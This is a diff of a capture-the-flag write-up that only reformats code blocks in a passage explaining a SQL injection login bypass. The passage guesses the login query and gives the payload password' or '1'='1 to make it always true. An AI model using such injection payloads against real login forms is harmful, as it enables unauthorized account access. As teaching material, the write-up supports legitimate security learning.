@@ -619,13 +619,13 @@ And, here's the flag if you join bytes all together.
 ![](Untitled-75c9f546-23a8-4a3f-9b4e-2fe0a893eaa7.png)
 
 It takes email and password, so we can predict SQL query that verify login.
-
-    SELECT * FROM `users` WHERE email='email' and password='password';
-
+```sql
+SELECT * FROM `users` WHERE email='email' and password='password';
+```
 To make this query true, let's append additional string.
-
-    SELECT * FROM `users` WHERE email='email' and password='password' or '1'='1';
-
+```sql
+SELECT * FROM `users` WHERE email='email' and password='password' or '1'='1';
+```
 And, just send `password' or '1'='1` for password!
 
 ![](Untitled-2bf5bc7a-a4d9-47a8-96c0-a8339be526c8.png)
